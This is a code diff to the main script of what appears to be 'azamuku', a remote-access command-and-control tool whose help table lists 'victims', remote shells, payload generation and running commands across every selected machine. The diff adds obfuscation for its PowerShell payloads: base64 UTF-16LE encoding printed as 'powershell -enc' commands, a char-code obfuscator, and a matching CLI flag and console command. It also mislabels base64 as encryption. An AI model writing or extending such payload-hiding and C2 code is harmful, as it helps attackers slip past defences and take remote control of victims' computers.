@@ -9,6 +9,7 @@ import subprocess
 import re
 import sys
 import atexit
+import base64 as _b64
 
 """
 written by otter - github.com/whatotter
@@ -219,6 +220,19 @@ def interactive(uid):
 
     return None
 
+def _to_charcode(text):
+    """Convert a string to PowerShell [char]0xNN obfuscated form."""
+    return '+'.join(f'[char]0x{ord(c):02x}' for c in text)
+
+def print_payload(payload, highlights, args):
+    """Print payload, optionally encoding it as base64 or hex based on CLI flags."""
+    if args.base64:
+        encoded = _b64.b64encode(payload.encode('utf-16-le')).decode()
+        print("[+] base64 encode:\n")
+        print(f"powershell -enc {encoded}")
+    else:
+        print(highlight(payload, highlights, color=(150, 0, 0)))
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
@@ -259,6 +273,11 @@ if __name__ == '__main__':
     
     parser.add_argument("-ng", "--ngrok",
                         help="use ngrok for tunneling (requires ngrok to be installed)",
+                        action="store_true",
+                        default=False)
+                        
+    parser.add_argument("-b64", "--base64",
+                        help="encode generated payloads as base64 (powershell -enc)",
                         action="store_true",
                         default=False)
 
@@ -524,7 +543,7 @@ if __name__ == '__main__':
                     
                     # we pass "443" as port just to satisfy the function signature, but it's not used in tunnel.txt/ngrok.txt
                     payload = s.payload.generatePayload(ip, "443", target_payload)
-                    print(highlight(payload, [ip], color=(150, 0, 0)))
+                    print_payload(payload, [ip], args)
                     
                     # TEMPORARILY DISABLED - hotplug payload generation
                     # if hotPlug:
@@ -544,13 +563,13 @@ if __name__ == '__main__':
                         port = args.http_port
                         payload = s.payload.generatePayload(ip, port, "http.txt")
                         print("[+] HTTP payload ({}:{}):\n".format(ip, port))
-                        print(highlight(payload, [ip, port], color=(150, 0, 0)))
+                        print_payload(payload, [ip, port], args)
 
                     if int(args.https_port) != 0:
                         port = args.https_port
                         payload = s.payload.generatePayload(ip, port, "https.txt")
                         print("[+] HTTPS payload ({}:{}):\n".format(ip, port))
-                        print(highlight(payload, [ip, port], color=(150, 0, 0)))
+                        print_payload(payload, [ip, port], args)
                 else:
                     # No tunnel, require IP and port arguments
                     if cArgs == None:
@@ -568,7 +587,7 @@ if __name__ == '__main__':
                         target_payload = "localtunnel.txt"
 
                     payload = s.payload.generatePayload(ip, port, target_payload)
-                    print(highlight(payload, [ip, port], color=(150, 0, 0)))
+                    print_payload(payload, [ip, port], args)
 
                     # TEMPORARILY DISABLED - hotplug payload generation
                     # if hotPlug:
@@ -612,6 +631,7 @@ if __name__ == '__main__':
                 commands = {
                     "clear": ["clears the text screen on your terminal", "clear"],
                     "info": ["shows all victims connected to this azamuku instance, plus info", "info"],
+                    "base64": ["converts a payload into encrypted base64", "base64 (payload)"],
                     "shell": ["runs an interactive shell on a specific uid", "shell (uid)"],
                     "payload": ["generates a payload (auto-uses tunnel URL if active)", "payload [ip] [port]"],
                     "allow": ["authorizes a uid, or a file of uids - ex: from an old payload", "allow (uid, file)"],
@@ -623,7 +643,7 @@ if __name__ == '__main__':
                     # "hotplug": ["launches an server for hotplug attacks", "hotplug (port)"],
                     "rm": ["deletes a uid from authorized and from table", "rm (uid)"],
                     "select": ["selects a uid for multirun - can also select all with *", "select (uid)"],
-                    "multirun": ["runs a command on each uid selected", "multirun (cmd)"]
+                    "multirun": ["runs a command on each uid selected", "multirun (cmd)"],
                 }
 
                 t = PrettyTable(["command", "description", "usage"])
@@ -713,6 +733,14 @@ if __name__ == '__main__':
 
                     print("[+] ran command \"{}\" on uid \"{}\"".format(x, command))
             
+            elif cmd.lower() == "base64":
+                if cArgs == None:
+                    print("[+] not enough arguments - usage: base64 (payload)")
+                    continue
+                encoded = _b64.b64encode(cArgs.encode('utf-16-le')).decode()
+                print("[+] Base64 encoded payload:\n")
+                print(f"powershell -enc {encoded}")
+
             else:
                 print("[+] not a valid command - run 'help' for a table of them")
         except Exception as e:
